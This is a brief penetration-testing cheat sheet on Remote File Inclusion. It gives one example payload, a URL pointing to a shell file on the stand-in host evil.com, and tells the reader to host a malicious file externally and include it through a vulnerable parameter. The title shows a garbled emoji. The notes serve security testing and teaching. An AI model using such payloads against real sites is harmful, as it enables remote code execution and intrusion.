# üåê Remote File Inclusion (RFI)

## Overview
Remote File Inclusion (RFI) allows attackers to include a remote file through the web browser.

## Steps to Test
1. Test with basic RFI payloads:
    ```bash
    http://evil.com/shell.txt
    ```
2. Host a malicious file on an external server and include it through the vulnerable parameter.

## Tips
- Test inputs in URL parameters, form fields, and cookies.
- Verify if remote file contents are included in the response.
- Use tools like RIPS to identify and exploit RFI vulnerabilities.
